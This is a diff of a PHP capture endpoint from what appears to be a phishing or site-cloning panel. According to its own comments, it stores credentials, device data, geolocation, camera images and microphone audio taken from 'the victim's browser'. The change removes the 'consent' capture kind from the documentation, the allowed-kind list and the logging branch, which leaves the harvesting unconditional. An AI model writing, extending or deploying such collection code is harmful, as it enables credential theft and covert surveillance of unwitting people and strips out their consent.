@@ -4,12 +4,11 @@
  * running in the victim's browser. Writes the captured data into the
  * matching target's storage so it shows up in the panel.
  *
- *   POST /api/capture.php?slug=<slug>&kind=device|geo|cred|consent|camera|mic
+ *   POST /api/capture.php?slug=<slug>&kind=device|geo|cred|camera|mic
  *
  *   - device  : application/json body  → events table
  *   - geo     : application/json body  → events table
  *   - cred    : application/json body  → events table
- *   - consent : application/json body  → events table
  *   - camera  : raw base64 PNG (or {data: ...})  → captures/<ts>.png + media table
  *   - mic     : raw audio bytes (or {data: ...}) → audio/<ts>.webm + media table
  *
@@ -34,7 +33,7 @@ if (!cloner_valid_slug($slug)) {
     http_response_code(400);
     exit('bad slug');
 }
-if (!in_array($kind, ['device', 'geo', 'cred', 'consent', 'camera', 'mic'], true)) {
+if (!in_array($kind, ['device', 'geo', 'cred', 'camera', 'mic'], true)) {
     http_response_code(400);
     exit('bad kind');
 }
@@ -47,7 +46,7 @@ if (!is_dir($target_dir)) {
 
 $now = time();
 
-if ($kind === 'device' || $kind === 'geo' || $kind === 'cred' || $kind === 'consent') {
+if ($kind === 'device' || $kind === 'geo' || $kind === 'cred') {
     if (store_event_log_size($slug) >= CAPTURE_MAX_LOG_BYTES) {
         http_response_code(429);
         exit('log full');
